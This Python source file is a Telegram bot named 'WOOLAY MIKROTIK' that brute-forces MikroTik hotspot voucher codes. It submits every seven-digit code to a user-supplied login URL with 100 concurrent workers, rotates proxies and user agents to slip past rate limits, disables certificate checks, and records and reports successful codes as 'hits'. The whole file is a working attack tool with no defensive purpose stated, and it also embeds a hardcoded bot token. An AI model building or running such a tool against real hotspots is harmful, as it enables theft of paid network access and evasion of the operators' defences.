#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WOOLAY MIKROTIK - Simple Working Version"""

import os
import sys
import json
import time
import random
import threading
import datetime
import concurrent.futures
from typing import Optional, Set, List, Dict

import requests
requests.packages.urllib3.disable_warnings()

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters,
)

from flask import Flask
from threading import Thread

# ═══════════════════════════════════════════════════════════════
#  KEEP ALIVE
# ═══════════════════════════════════════════════════════════════

_flask = Flask(__name__)

@_flask.route("/")
def _home():
    return "WOOLAY alive", 200

def _flask_run():
    _flask.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

def keep_alive():
    Thread(target=_flask_run, daemon=True).start()

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN  = "8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o"
OWNER      = "@Woolay"
OWNER_LINK = "https://t.me/Woolay"

HIT_FILE   = "hits.txt"
PROXY_FILE = "proxies.txt"
STATE_FILE = "state.json"

NUM_WORKERS    = 100
CODE_LENGTH    = 7
CODE_TOTAL     = 10 ** CODE_LENGTH
REQ_TIMEOUT    = 15

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
]

# ═══════════════════════════════════════════════════════════════
#  GLOBAL
# ═══════════════════════════════════════════════════════════════

scanners: Dict[int, dict] = {}

# ═══════════════════════════════════════════════════════════════
#  PROXY
# ═══════════════════════════════════════════════════════════════

def load_proxies() -> List[str]:
    try:
        if not os.path.exists(PROXY_FILE):
            return []
        with open(PROXY_FILE) as f:
            lines = f.read().splitlines()
        result = []
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if not line.startswith(("http://", "https://", "socks4://", "socks5://")):
                line = "socks5://" + line
            result.append(line)
        return result
    except Exception:
        return []

def save_proxies(proxies: List[str]):
    try:
        with open(PROXY_FILE, "w") as f:
            f.write("\n".join(proxies))
    except Exception:
        pass

def add_proxies(lines: List[str]) -> tuple:
    current = load_proxies()
    added = 0
    invalid = 0
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith(("http://", "https://", "socks4://", "socks5://")):
            line = "socks5://" + line
        if line in current:
            invalid += 1
            continue
        current.append(line)
        added += 1
    if added:
        save_proxies(current)
    return added, invalid

# ═══════════════════════════════════════════════════════════════
#  STATE
# ═══════════════════════════════════════════════════════════════

def load_state(uid: int) -> dict:
    try:
        if not os.path.exists(STATE_FILE):
            return {}
        with open(STATE_FILE, "r") as f:
            return json.load(f).get(str(uid), {})
    except Exception:
        return {}

def save_state(uid: int, data: dict):
    try:
        all_data = {}
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, "r") as f:
                all_data = json.load(f)
        all_data[str(uid)] = data
        with open(STATE_FILE, "w") as f:
            json.dump(all_data, f, indent=2)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
#  CHECKER
# ═══════════════════════════════════════════════════════════════

def check_one_code(code: str, login_url: str, proxy: Optional[str] = None) -> str:
    """Check one code. Returns: 'hit' | 'bad' | 'limit' | 'net'"""

    dst = f"http://192.168.{random.randint(0,255)}.{random.randint(1,254)}/"
    ua = random.choice(USER_AGENTS)

    headers = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":           "en-US,en;q=0.9",
        "Content-Type":              "application/x-www-form-urlencoded",
        "User-Agent":                ua,
        "Upgrade-Insecure-Requests": "1",
    }

    data = {
        "dst":      dst,
        "popup":    "true",
        "username": code,
        "password": "",
    }

    proxy_dict = None
    if proxy:
        proxy_dict = {"http": proxy, "https": proxy}

    try:
        r = requests.post(
            login_url,
            data=data,
            headers=headers,
            proxies=proxy_dict,
            timeout=REQ_TIMEOUT,
            verify=False,
            allow_redirects=True,
        )
        body = r.text.lower()

        # HIT
        if "you are logged in" in body:
            return "hit"

        if ("invalid username or password" not in body
            and "already authorizing" not in body
            and "error" not in body
            and len(r.text) > 100):
            return "hit"

        # BAD
        if "invalid username or password" in body:
            return "bad"

        # LIMIT
        if any(w in body for w in ["already authorizing", "retry later", "request limited", "too many"]):
            return "limit"

        return "bad"

    except requests.exceptions.Timeout:
        return "net"
    except requests.exceptions.ConnectionError:
        return "net"
    except Exception:
        return "net"

# ═══════════════════════════════════════════════════════════════
#  SCANNER
# ═══════════════════════════════════════════════════════════════

def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, bot):
    """Run scanner in background thread"""

    state = scanners.get(uid)
    if state is None:
        return

    proxies = load_proxies()
    proxy_idx = 0
    tried_set: Set[str] = set()
    counter = start_counter
    tried_n = 0
    hits = 0
    limits = 0
    net_err = 0
    last_hit = None
    current_code = None
    hit_list = []

    start_time = time.time()

    def get_proxy():
        nonlocal proxy_idx
        if not proxies:
            return None
        p = proxies[proxy_idx % len(proxies)]
        proxy_idx += 1
        return p

    def send_dashboard():
        elapsed = max(time.time() - start_time, 1)
        speed = int(tried_n / elapsed * 60)
        px_txt = f"🕷️ {len(proxies)}" if proxies else "⚡ DIRECT"

        hit_lines = ""
        for h in hit_list[-10:]:
            hit_lines += f"\n  ▸ <code>{h}</code>"
        if not hit_list:
            hit_lines = "\n  💀 None yet"

        txt = (
            "╔═════════════════════════╗\n"
            "║  ⚡ <b>WOOLAY MIKROTIK</b> ⚡  ║\n"
            "╚═════════════════════════╝\n\n"
            "🔍 <b>SEARCHING...</b>\n\n"
            "📊 <b>STATS</b>\n"
            f"├ 👁️ Tested  <code>{tried_n:,}</code>\n"
            f"├ 🩸 Hits    <code>{hits}</code>\n"
            f"├ ⚠️ Limits  <code>{limits}</code>\n"
            f"└ ❌ Errors  <code>{net_err}</code>\n\n"
            "⚡ <b>SPEED</b>\n"
            f"├ 🚀 <code>{speed:,} c/m</code>\n"
            f"├ 👥 Workers <code>{NUM_WORKERS}</code>\n"
            f"└ 🕷️ <code>{px_txt}</code>\n\n"
            "🎯 <b>NOW</b>\n"
            f"├ 🔮 <code>{current_code or '—'}</code>\n"
            f"├ 🗡️ <code>{last_hit or '—'}</code>\n\n"
            f"🎁 <b>HITS • {len(hit_list)}</b>"
            f"{hit_lines}\n\n"
            f"╭─ ⚡ WOOLAY ─╮"
        )
        try:
            bot.edit_message_text(
                chat_id=uid,
                message_id=state.get("dash_id"),
                text=txt,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")]]
                ),
            )
        except Exception:
            pass

    last_dash = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
        futures = {}

        while not state["stop_flag"].is_set():

            # Submit new codes
            while len(futures) < NUM_WORKERS * 2:
                if mode == "num7":
                    if counter >= CODE_TOTAL:
                        break
                    code = str(counter).zfill(CODE_LENGTH)
                    counter += 1
                else:
                    code = str(random.randint(0, CODE_TOTAL - 1)).zfill(CODE_LENGTH)

                if code in tried_set:
                    continue
                tried_set.add(code)

                proxy = get_proxy()
                future = executor.submit(check_one_code, code, login_url, proxy)
                futures[future] = code

            if not futures:
                break

            # Collect results
            done_futures = []
            for fut in list(futures.keys()):
                if fut.done():
                    done_futures.append(fut)

            if not done_futures:
                time.sleep(0.01)
                continue

            for fut in done_futures:
                code = futures.pop(fut)
                try:
                    result = fut.result()
                except Exception:
                    result = "net"

                tried_n += 1
                current_code = code

                if result == "hit":
                    hits += 1
                    hit_list.append(code)
                    last_hit = code
                    # Save hit
                    try:
                        with open(HIT_FILE, "a") as f:
                            f.write(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {code}\n")
                    except Exception:
                        pass
                    # Notify
                    try:
                        bot.send_message(
                            uid,
                            f"🎉 <b>HIT!</b>\n🔑 <code>{code}</code>",
                            parse_mode=ParseMode.HTML,
                        )
                    except Exception:
                        pass

                elif result == "limit":
                    limits += 1

                elif result == "net":
                    net_err += 1

            # Dashboard update every 3 seconds
            now = time.time()
            if now - last_dash >= 3:
                send_dashboard()
                last_dash = now

            # Save state every 20 seconds
            if now - start_time > 0 and int(now) % 20 == 0:
                save_state(uid, {
                    "url": login_url, "mode": mode,
                    "counter": counter, "tried_n": tried_n,
                    "hits": hits, "limits": limits, "net": net_err,
                    "last_hit": last_hit,
                    "hit_list": hit_list[-100:],
                })

    # Final dashboard
    elapsed = max(time.time() - start_time, 1)
    speed = int(tried_n / elapsed * 60)
    px_txt = f"🕷️ {len(proxies)}" if proxies else "⚡ DIRECT"

    hit_lines = ""
    for h in hit_list[-20:]:
        hit_lines += f"\n  ▸ <code>{h}</code>"

    txt = (
        "╔═════════════════════════╗\n"
        "║   💀 <b>SCAN STOPPED</b> 💀   ║\n"
        "╚═════════════════════════╝\n\n"
        "📊 <b>FINAL</b>\n"
        f"├ 👁️ Tested  <code>{tried_n:,}</code>\n"
        f"├ 🩸 Hits    <code>{hits}</code>\n"
        f"├ ⚠️ Limits  <code>{limits}</code>\n"
        f"├ ❌ Errors  <code>{net_err}</code>\n"
        f"├ 🚀 Speed   <code>{speed:,} c/m</code>\n"
        f"└ 🕷️ <code>{px_txt}</code>\n\n"
        f"🎁 <b>HITS • {len(hit_list)}</b>"
        f"{hit_lines}\n\n"
        "💾 <i>/start to resume</i>\n\n"
        "╭─ ⚡ WOOLAY ─╮"
    )
    try:
        bot.edit_message_text(
            uid, state.get("dash_id"), txt,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🦇 BACK", callback_data="btn_back")]]
            ),
        )
    except Exception:
        pass

    save_state(uid, {
        "url": login_url, "mode": mode,
        "counter": counter, "tried_n": tried_n,
        "hits": hits, "limits": limits, "net": net_err,
        "last_hit": last_hit,
        "hit_list": hit_list[-100:],
    })

    state["running"] = False

# ═══════════════════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════════════════

def main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔮 LOGIN URL", callback_data="btn_url"),
         InlineKeyboardButton("📜 MODES", callback_data="btn_mode")],
        [InlineKeyboardButton("⚡ START", callback_data="btn_start"),
         InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")],
        [InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_proxy"),
         InlineKeyboardButton("👁️ STATUS", callback_data="btn_status")],
        [InlineKeyboardButton("⚡ WOOLAY ⚡", url=OWNER_LINK)],
    ])

def mode_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🩸 07 Sequential", callback_data="m_num7"),
         InlineKeyboardButton("🎲 07 Random", callback_data="m_rand7")],
        [InlineKeyboardButton("🦇 BACK", callback_data="btn_back")],
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="btn_back")]])

# ═══════════════════════════════════════════════════════════════
#  HANDLERS
# ═══════════════════════════════════════════════════════════════

async def cmd_start(update, context):
    uid = update.effective_user.id
    if "mode" not in context.user_data:
        context.user_data["mode"] = "num7"
    if "login_url" not in context.user_data:
        context.user_data["login_url"] = ""

    url = context.user_data["login_url"]
    mode = context.user_data["mode"]
    proxies = load_proxies()
    px = f"🕷️ {len(proxies)}" if proxies else "⚡ Direct"
    ul = f"🔮 URL: ✅\n<code>{url}</code>" if url else "❌ URL: Not set"

    sv = load_state(uid)
    rv = ""
    if sv:
        rv = (f"\n💾 <b>Saved</b>\n"
              f"├ Tried: <code>{sv.get('tried_n',0):,}</code>\n"
              f"└ Hits:  <code>{sv.get('hits',0)}</code>\n")

    txt = (f"╔═════════════════════════╗\n"
           "║     ⚡ <b>WOOLAY</b> ⚡       ║\n"
           "╚═════════════════════════╝\n\n"
           f"📜 Mode: <code>{mode}</code>\n"
           f"{px}\n"
           f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
           f"{ul}\n{rv}\n"
           "💡 <i>/stop to stop</i>")

    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())

async def cmd_stop(update, context):
    uid = update.effective_user.id
    st = scanners.get(uid)
    if st and st.get("running"):
        st["stop_flag"].set()
        await update.message.reply_text("🛑 <b>Stopping...</b>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("⚠️ Not running", parse_mode=ParseMode.HTML)

async def on_btn(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    d = q.data

    if "mode" not in context.user_data:
        context.user_data["mode"] = "num7"
    if "login_url" not in context.user_data:
        context.user_data["login_url"] = ""

    if d == "btn_back":
        await cmd_start(q, context)
        return

    if d == "btn_url":
        context.user_data["wait_url"] = True
        cur = context.user_data.get("login_url", "Not set")
        await q.edit_message_text(
            f"🔮 <b>Send Login URL</b>\n\nCurrent: <code>{cur}</code>\n\nNew URL:",
            parse_mode=ParseMode.HTML, reply_markup=back_kb())

    elif d == "btn_mode":
        await q.edit_message_text("📜 <b>Mode</b>", parse_mode=ParseMode.HTML, reply_markup=mode_kb())

    elif d.startswith("m_"):
        context.user_data["mode"] = d[2:]
        await cmd_start(q, context)

    elif d == "btn_start":
        if scanners.get(uid, {}).get("running"):
            await q.answer("⚠️ Running!", show_alert=True)
            return
        url = context.user_data.get("login_url", "")
        if not url:
            await q.answer("❌ Set URL first!", show_alert=True)
            return

        mode = context.user_data.get("mode", "num7")
        sv = load_state(uid)
        counter = sv.get("counter", 0) if sv.get("url") == url else 0

        msg = await q.edit_message_text("⚡ <b>Starting...</b>", parse_mode=ParseMode.HTML)

        stop_flag = threading.Event()
        scanners[uid] = {
            "running": True,
            "stop_flag": stop_flag,
            "dash_id": msg.message_id,
        }

        t = Thread(
            target=run_scanner_thread,
            args=(uid, url, mode, counter, context.bot),
            daemon=True,
        )
        t.start()

    elif d == "stop_scan":
        st = scanners.get(uid)
        if st and st.get("running"):
            st["stop_flag"].set()
            await q.answer("🛑 Stopping!")
        else:
            await q.answer("Not running", show_alert=True)

    elif d == "btn_status":
        proxies = load_proxies()
        await q.edit_message_text(
            f"🕷️ <b>Proxy</b>\n\nActive: <code>{len(proxies)}</code>",
            parse_mode=ParseMode.HTML, reply_markup=back_kb())

    elif d == "btn_proxy":
        context.user_data["wait_px"] = True
        await q.edit_message_text(
            "🕷️ <b>Send proxies</b> (one/line)\n\n<code>host:port</code>\n<code>socks5://host:port</code>",
            parse_mode=ParseMode.HTML, reply_markup=back_kb())

async def on_msg(update, context):
    uid = update.effective_user.id
    txt = update.message.text

    if context.user_data.get("wait_url"):
        context.user_data["wait_url"] = False
        context.user_data["login_url"] = txt.strip()
        await update.message.reply_text("✅ <b>URL Saved!</b>", parse_mode=ParseMode.HTML)
        await cmd_start(update, context)

    elif context.user_data.get("wait_px"):
        context.user_data["wait_px"] = False
        a, b = add_proxies(txt.strip().splitlines())
        total = len(load_proxies())
        await update.message.reply_text(
            f"🕷️ Added: <code>{a}</code> | Invalid: <code>{b}</code> | Total: <code>{total}</code>",
            parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    keep_alive()

    print("=" * 50)
    print("  WOOLAY MIKROTIK - Starting...")
    print("=" * 50)

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CallbackQueryHandler(on_btn))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_msg))

    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
